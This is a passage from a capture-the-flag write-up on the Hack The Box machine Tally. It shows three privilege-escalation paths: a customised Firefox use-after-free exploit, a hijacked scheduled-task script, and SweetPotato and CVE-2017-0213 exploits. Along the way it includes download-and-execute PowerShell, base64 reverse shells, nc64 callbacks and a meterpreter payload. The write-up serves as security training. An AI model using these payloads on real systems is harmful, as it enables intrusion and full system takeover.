> Rahul - please upload the design mock ups to the Intranet folder as ‘index.html’ using the ftp\_user account - I aim to review regularly.

This implies that I can get a HTML page in front of Sarah or Tim.

During the [FTP enumeration](#enumeration), I also found `Firefox Setup 44.0.2.exe`, which is a good hint as to what version of Firefox is running.

#### Test Connection

To see if I can actually get a user on Tally to open `index.html`, I’ll create a quick on that just redirects to my server. If this works, then later I can start working on my exploit without having to FTP it to Tally each time. This simple page uses JavaScript to redirect:

```

<html>
  <head></head>
  <body>
    <script>location.href = "http://10.10.14.6/sploit.html"</script>
  </body>
</html>

```

I’ll upload that, and start `nc` listening on 80 to see the full incoming request. After less than a minute, there’s a connection:

```

oxdf@hacky$ nc -lnvkp 80
Listening on 0.0.0.0 80
Connection received on 10.10.10.59 58765
GET /sploit.html HTTP/1.1
Host: 10.10.14.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:81/HRTJYKYRBSHYJ/index.html
Connection: keep-alive

```

The `User-Agent` header ends with “Firefox/44.0”. [useragentstring.com](http://useragentstring.com/index.php) will give even more detail:

![image-20220410132901574](https://0xdfimages.gitlab.io/img/image-20220410132901574.png)

#### Search Sploit

Using `searchploit` to look for Firefox exploits returns a ton, but one jumps off a close to this version:

```

oxdf@hacky$ searchsploit "firefox 4"                         
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path                 
-------------------------------------------------------------------- ---------------------------------
...[snip]...
Mozilla Firefox < 45.0 - 'nsHtml5TreeBuilder' Use-After-Free (EMET  | windows/remote/42484.html
...[snip]...

```

I’ll grab a copy:

```

oxdf@hacky$ searchsploit -m windows/remote/42484.html
  Exploit: Mozilla Firefox < 45.0 - 'nsHtml5TreeBuilder' Use-After-Free (EMET 5.52 Bypass)
      URL: https://www.exploit-db.com/exploits/42484
     Path: /opt/exploitdb/exploits/windows/remote/42484.html
File Type: HTML document, ASCII text

Copied to: /home/oxdf/hackthebox/tally-10.10.10.59/42484.html

```

It’s an HTML page, with the title CVE-2016-1960.

### Customize Exploit

#### Identify Shellcode

Opening the script, towards the top, there’s a variable named `shellcode`:

![image-20220410133758269](https://0xdfimages.gitlab.io/img/image-20220410133758269.png)

After a `push 0` and before `push 1`, there’s a place where the string `calc.exe` is pushed onto the stack. Because of how the stack works, it’s pushing four bytes at a time, reading from the end of the string.

#### New Payload

Instead of `calc.exe`, I’ll run `powershell -c iex(iwr('http://10.10.14.6/0xdf.ps1'))`. I can use Python to quickly format that into what I need for the HTML page.

```

>>> payload = "powershell -c iex(iwr('http://10.10.14.6/0xdf.ps1'))"
>>> for i in range(len(payload)-4, -1, -4):
...     print(payload[i:i+4])
... 
1'))
f.ps
/0xd
14.6
.10.
//10
ttp:
r('h
x(iw
c ie
ll -
rshe
powe

```

If my payload is not of length divisible by four, it won’t print the beginning here. The simplest thing to do would be to adjust the payload to be divisible by four, but you could also mess with the Python.

Now I want each of these to be hex, starting with a `\x68`, the op code for `push`, and add quotes, commas, etc.

```

>>> for i in range(len(payload)-4, -1, -4):
...     print('    "\\x68' + ''.join([f'{ord(c):02x}' for c in payload[i:i+4]]) + '",')
... 
    "\x6831272929",
    "\x68662e7073",
    "\x682f307864",
    "\x6831342e36",
    "\x682e31302e",
    "\x682f2f3130",
    "\x687474703a",
    "\x6872282768",
    "\x6878286977",
    "\x6863206965",
    "\x686c6c202d",
    "\x6872736865",
    "\x68706f7765",

```

I’ll replace the two `calc.exe` lines in the HTML file with these.

### Exploit

I can’t use an encoded PowerShell (`iex` won’t run `powershell -e`), but since #3 has been working, I’ll grab that version from [revshells.com](https://www.revshells.com/), and and remove PowerShell calling it and the PowerShell arguments, leaving just have the payload in `0xdf.ps1`.

Now I wait for sarah to open firefox and view `index.html`, which redirects to `sploit.html`:

```
10.10.10.59 - - [10/Apr/2022 18:49:33] "GET /sploit.html HTTP/1.1" 200 -

```

After some failed attempts to get `favicon.ico`, there’s a string of redirections to various `continue=#` parameters on `sploit.html`, about one per second for about a minute:

```
10.10.10.59 - - [10/Apr/2022 18:49:35] "GET /sploit.html?continue=77571776 HTTP/1.1" 200 -
10.10.10.59 - - [10/Apr/2022 18:49:35] "GET /sploit.html?continue=143632064 HTTP/1.1" 200 -
10.10.10.59 - - [10/Apr/2022 18:49:37] "GET /sploit.html?continue=209692352 HTTP/1.1" 200 -
10.10.10.59 - - [10/Apr/2022 18:49:38] "GET /sploit.html?continue=275752640 HTTP/1.1" 200 -
10.10.10.59 - - [10/Apr/2022 18:49:39] "GET /sploit.html?continue=341812928 HTTP/1.1" 200 -
...[snip]...
10.10.10.59 - - [10/Apr/2022 18:50:31] "GET /sploit.html?continue=77575904 HTTP/1.1" 200 -
10.10.10.59 - - [10/Apr/2022 18:50:33] "GET /sploit.html?continue=143636192 HTTP/1.1" 200 -
10.10.10.59 - - [10/Apr/2022 18:50:34] "GET /sploit.html?style=192919264 HTTP/1.1" 200 -

```

At the end, there’s a GET on `sploit.html?style=#`, and then it hangs for about 15 seconds. Then it gets `0xdf.ps1`:

```
10.10.10.59 - - [10/Apr/2022 18:50:49] "GET /0xdf.ps1 HTTP/1.1" 200 - 

```

After that, there’s a connection at `nc`:

```

oxdf@hacky$ sudo rlwrap -cAr nc -lvnp 445
Listening on 0.0.0.0 445
Connection received on 10.10.10.59 59874
SHELL> whoami
tally\sarah

```

## Shell as Administrator [Task - path 1]

### Enumeration

On the desktop there’s a bunch of other files:

```

PS C:\users\sarah\desktop> ls

    Directory: C:\users\sarah\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       01/10/2017     22:32            916 browser.bat
-a----       17/09/2017     21:50            845 FTP.lnk
-a----       23/09/2017     21:11            297 note to tim (draft).txt
-a----       19/10/2017     21:49          17152 SPBestWarmUp.ps1
-a----       19/10/2017     22:48          11010 SPBestWarmUp.xml
-a----       17/09/2017     21:48           1914 SQLCMD.lnk
-a----       21/09/2017     00:46            129 todo.txt
-ar---       09/04/2022     11:46             34 user.txt
-a----       17/09/2017     21:49            936 zz_Migration.lnk  

```

For this part, I’m interested in `SPBestWarmUp.ps1` and `SPBestWarmUp.xml`. The former is a PowerShell script, which I believe is actually an older version of [this](https://github.com/spjeff/spbestwarmup/blob/master/SPBestWarmUp.ps1). It’s designed to help with caching on a Windows IIS server. But the contents don’t really matter

`SPBestWarmUp.xml` is an exported scheduled task:

```

<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <Repetition>
        <Interval>PT1H</Interval>
        <Duration>P1D</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2017-01-25T01:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
...[snip]...

```

At the top it defines the trigger, which is every hour each day starting at 0100. This is a really slow cron for HTB, but maybe it could still be interesting. There’s also triggers based on event logs that indicate the server ran out of memory.

Going down a bit, it is set to run as Administrator:

```

...[snip]...
  <Principals>
    <Principal id="Author">
      <UserId>TALLY\Administrator</UserId>
      <LogonType>Password</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals> 
...[snip]...

```

At the very bottom, it shows it runs the PowerShell script:

```

...[snip]...
  <Actions Context="Author">
    <Exec>
      <Command>PowerShell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -File SPBestWarmUp.ps1 -skipadmincheck</Arguments
      <WorkingDirectory>C:\Users\Sarah\Desktop</WorkingDirectory>
    </Exec>
  </Actions> 
...[snip]...

```

Also, sarah has full control over this file:

```

PS C:\users\sarah\desktop> icacls SPBestWarmUp.ps1
SPBestWarmUp.ps1 NT AUTHORITY\SYSTEM:(F)
                 BUILTIN\Administrators:(F)
                 TALLY\Sarah:(F)

Successfully processed 1 files; Failed processing 0 files

```

### Reverse Shell

I’ll generate another shell (this time on 444), and (after creating a backup), replace `SPBestWarmUp.ps1` with the shell:

```

PS C:\users\sarah\desktop> copy SPBestWarmUp.ps1 SPBestWarmUp.ps1.bak
PS C:\users\sarah\desktop> echo "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" > SPBestWarmUp.ps1

```

When the hour rolls over, it generates a shell:

```

oxdf@hacky$ nc -lnvp 444
Listening on 0.0.0.0 444
Connection received on 10.10.10.59 52566
whoami
tally\administrator
PS C:\Users\Sarah\Desktop>

```

I can grab `root.txt`:

```

PS C:\users\administrator\desktop> type root.txt
beca32df************************

```

## Shell as SYSTEM [SeImpersonate - path 2]

### Enumeration

sarah is running MSSQL, and on Windows, it’s very common for services to run as a user with the `SeImpersonatePrivilege`. If I get a shell via MSSQL, sarah has this privilege:

```

PS C:\users\sarah\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

Interestingly, if I get this shell via the FireFox exploit, sarah has many fewer privileges:

```

SHELL> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

```

When I originally solved this in 2018, I used [RottenPotato](https://github.com/foxglovesec/RottenPotato). Since then, as Windows blocked various methods for exploiting `SeImpersonate`, the exploit has evolved and improved, to [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG), [LonelyPotato](https://github.com/decoder-it/lonelypotato), [JuicyPotato](https://github.com/ohpe/juicy-potato), and [RoguePotato](https://github.com/antonioCoco/RoguePotato), as well as exploits like [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RogueWinRM](https://github.com/antonioCoco/RogueWinRM).

### SweetPotato

For this time, I’ll show [SweetPotato](https://github.com/CCob/SweetPotato), which is a single tool with a bunch of different `SeImpersonate` exploits built in.

I’ll upload it to Tally using the shell gained via MSSQL:

```

PS C:\programdata> iwr 10.10.14.6/SweetPotato.exe -outfile sp.exe
PS C:\programdata> iwr 10.10.14.6/nc64.exe -outfile nc64.exe

```

I’ll also upload `nc64.exe`. I’ll start with all the defaults, giving it just a program to run `-p` and arguments for that program `-a`, generating a reverse shell via `nc64.exe`:

```

PS C:\programdata> .\sp.exe -p "\programdata\nc64.exe" -a "-e powershell 10.10.14.6 446"
SweetPotato by @_EthicalChaos_
  Original RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
[+] Attempting NP impersonation using method PrintSpoofer to launch \programdata\nc64.exe
[+] Triggering notification on evil PIPE \\TALLY/pipe/21e828a2-6bdd-4a23-9b7b-d03d423949a7
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!
PS C:\programdata> .\sp.exe

```

It returns a shell as SYSTEM:

```

oxdf@hacky$ nc -lnvp 446
Listening on 0.0.0.0 446
Connection received on 10.10.10.59 60044
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
nt authority\system

```

## Shell as SYSTEM [CVE - path 3]

### Enumeration

#### Identify Patch Level and CVE

Running `systeminfo` on the host will give lots of information, including what Hotfixs have been applied:

```

PS C:\programdata> systeminfo

Host Name:                 TALLY
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00376-30726-67778-AA877
Original Install Date:     28/08/2017, 15:43:34
System Boot Time:          10/04/2022, 22:12:01
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,047 MB
Available Physical Memory: 121 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 729 MB
Virtual Memory: In Use:    3,366 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB.LOCAL
Logon Server:              \\TALLY
Hotfix(s):                 2 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB4015217
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.59
                                 [02]: fe80::7581:5424:c9c4:f41e
                                 [03]: dead:beef::7581:5424:c9c4:f41e
                                 [04]: dead:beef::240
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```

KB4015217 is from [11 April 2017](https://support.microsoft.com/en-us/topic/april-11-2017-kb4015217-os-build-14393-1066-and-14393-1083-b5f79067-98bd-b4ec-8b81-5d858d7dc722), and this box released on 4 November 2017. CVE-2017-0213 was a well know privesc in Windows that became public in May 2017. It’s a bit hard to know this now in 2022, but this is the kind of thing that people would have known about in 2017, and this CVE is actually the intended path for Tally shown in the official HTB writeup.

#### Note to tim

On Sarah’s desktop, there’s a `note to tim (draft).txt`:

> Hi Tim,
>
> As discussed in the cybersec meeting, malware is often hidden in trusted executables in order to evade detection. I read somewhere that cmd.exe is a common target for backdooring, so I’ve gone ahead and disallowed any cmd.exe outside the Windows folder from executing.
>
> Thanks,
> Sarah

This is important, because the POCs for CVE-2017-0213 run `cmd.exe`, which will either pop a command prompt (which isn’t helpful to me), or, if I place a new binary in the current directory named `cmd.exe`, run that. So I could put a reverse shell in my current directory named `cmd.exe`, but this says that will be blocked.

I’ll have to edit and compile the exploit.

### Compile

#### Without Edits

In my Windows VM, I’ll download [this C++ source](https://www.exploit-db.com/exploits/42020) for the exploit. I’ll create a new project in Visual Studio, and add it in as a new file to the project. I always try to build right away to make sure I know if it builds or not before making any changes. This throws an error:

![image-20220410205625020](https://0xdfimages.gitlab.io/img/image-20220410205625020.png)

Some Goolging for this error finds several Stack Overflow posts, including [this one](https://stackoverflow.com/questions/53242871/start-info-lpdesktop-is-lpwstr-entity-but-it-says-this-is-const-wchat-t), where the user is trying to compile what looks like this exact exploit:

![image-20220410205720460](https://0xdfimages.gitlab.io/img/image-20220410205720460.png)

[The solution](

![image-20220410205731362](https://0xdfimages.gitlab.io/img/image-20220410205731362.png)
) is to cast that string to an `LPWSTR`:

```

	start_info.lpDesktop = LPWSTR (L"WinSta0\\Default");

```

After that change, the project builds.

#### With Edits

Instead of `cmd.exe`, I’ll just have it run `nc64.exe -e powershell 10.10.14.6 447`, which I set just below where that error happened:

```

	STARTUPINFO start_info = {};
	start_info.cb = sizeof(start_info);
	start_info.lpDesktop = LPWSTR (L"WinSta0\\Default");
	PROCESS_INFORMATION proc_info;
	WCHAR cmdline[] = L"nc64.exe -e powershell 10.10.14.6 447";
	if (CreateProcessAsUser(new_token.get(), nullptr, cmdline,
		nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, &start_info, &proc_info))
	{
		CloseHandle(proc_info.hProcess);
		CloseHandle(proc_info.hThread);
	}

```

I’ll build, and it compiles without error. Based on the fact that the exploit author is referring to EIP in the comments, I’ll build this as x86 (32-bit). Over the course of troubleshooting, I’ll end up trying both, but in the end, x86 is what works.

### Get Interactive Process

#### Troubleshooting

Just running the exploit from my current shell will report success, but won’t actually trigger the payload. There’s a handful of variables I can play with to see what might be breaking. There’s no good way to show in a blog post how I worked through these, but I can at least lay out what I consider:
- 32-bit vs 64-bit.
- Is it ok to have arguments in the payload?
- Interactive Session

#### Interactive Sessions

Unfortunately for me, I came up with the third option long after playing with the other two for a bit. [This article](https://brianbondy.com/blog/100/understanding-windows-at-a-deeper-level-sessions-window-stations-and-desktops) does a good job explaining sessions in depth, but the short bits I need to know here is that Windows groups processes into sessions, and each process belongs to exactly one session. Sessions can be interactive or non-interactive. For modern Windows (Vista+), session 0 is where the NT services are started, and it must be non-interactive. When I user logs in, their processes end up in a new session, which will often be session 1.

Many exploits that we want to run some other process must be run out of an interactive session. `$PID` is the id of the current process, which is in session (`SI`) 0:

```

PS C:\programdata> get-process -id $PID

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
-------  ------    -----      -----     ------     --  -- -----------                                                  
    590      37    72252      86792       5.06   8488   0 powershell

```

#### MSF

To migrate, the easiest way to do that is with Metasploit. I’ll generate a Powershell payload with `msfvenom` (using a high port so I don’t have to run MSF as root):

```

oxdf@hacky$ msfvenom -p windows/x64/meterpreter/reverse_tcp -f psh -o met.ps1 LHOST=10.10.14.6 LPORT=4443
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of psh file: 3249 bytes
Saved as: met.ps1

```

I’ll start `msfconsole`, `use exploit/multi/handler`, set the payload, `LHOST`, and `LPORT`, and run:

```

msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):                             

   Name  Current Setting  Required  Description                 
   ----  ---------------  --------  -----------

Payload options (windows/x64/meterpreter/reverse_tcp):              

   Name      Current Setting  Required  Description                 
   ----      ---------------  --------  -----------                 
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)                                       
   LHOST     10.10.14.6       yes       The listen address (an interface may be specified)
   LPORT     4443             yes       The listen port

Exploit target:                                                

   Id  Name                                                         
   --  ----
   0   Wildcard Target

msf6 exploit(multi/handler) > run

```

Now (with Python web server running), I’ll fetch and run `met.ps1`:

```

PS C:\programdata> iex(iwr http://10.10.14.6/met.ps1)
3088

```

At MSF, there’s a shell:

```

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.6:4443 
[*] Sending stage (200262 bytes) to 10.10.10.59
[*] Meterpreter session 1 opened (10.10.14.6:4443 -> 10.10.10.59:53811 ) at 2022-04-11 10:12:43 +0000

meterpreter > 

```

#### Migrate

I’ll look for a process in session 1 to migrate into by running `ps`:

```

meterpreter > ps         

Process List          
============           

 PID    PPID  Name                        Arch  Session  User         Path
 ---    ----  ----                        ----  -------  ----         ----
 0      0     [System Process]
 4      0     System
 76     580   vmacthlp.exe
 ...[snip]...
  4116   5624  firefox.exe                 x86   1        TALLY\Sarah  C:\Program Files (x86)\Mozilla Firefox\firefox.exe
 4168   4124  explorer.exe                x64   1        TALLY\Sarah  C:\Windows\explorer.exe
 4612   672   ShellExperienceHost.exe     x64   1        TALLY\Sarah  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
 4712   672   SearchUI.exe                x64   1        TALLY\Sarah  C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
 5556   4168  vmtoolsd.exe                x64   1        TALLY\Sarah  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
...[snip]...

```

`explorer.exe` is typically a good target.

```

meterpreter > migrate 4168
[*] Migrating from 8488 to 4168...
[*] Migration completed successfully.

```

### Exploit

From an interactive process, I’ll try the exploit again. I’ll upload the 32-bit version of the exploit that calls `nc64.exe` with arguments to `C:\programdata` (and `nc64.exe` if it’s not there from previous work). Then I’ll run `shell` to drop into a `cmd` instance from MSF.

```

meterpreter > shell
Process 8416 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```

From `C:\programdata`, I’ll run the exploit:

```

C:\ProgramData>dir
...[snip]...
11/04/2022  01:46            36,352 exp.exe
19/09/2017  22:14    <DIR>          Microsoft Help
11/04/2022  00:30            45,272 nc64.exe
...[snip]...
               6 File(s)        128,022 bytes
              13 Dir(s)   2,268,626,944 bytes free

C:\ProgramData>.\exp.exe 
Building Library with path: script:C:\ProgramData\run.sct
Found TLB name at offset 766
QI - Marshaller: {00000000-0000-0000-C000-000000000046} 015AE408
Queried Success: 015AE408
AddRef: 1
...[snip]...
Marshal Complete: 00000000
Release: 5
Release: 4
AddRef: 3
Release: 4
Release: 3
Result: 80029C4A
Done
Release: 1
Release object 015AE198
Release: 2

```

The payload was to call `nc64.exe` to my host on 447. At that listening `nc` there’s a shell as SYSTEM:

```

oxdf@hacky$ nc -lnvp 447
Listening on 0.0.0.0 447
Connection received on 10.10.10.59 53857
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
nt authority\system

```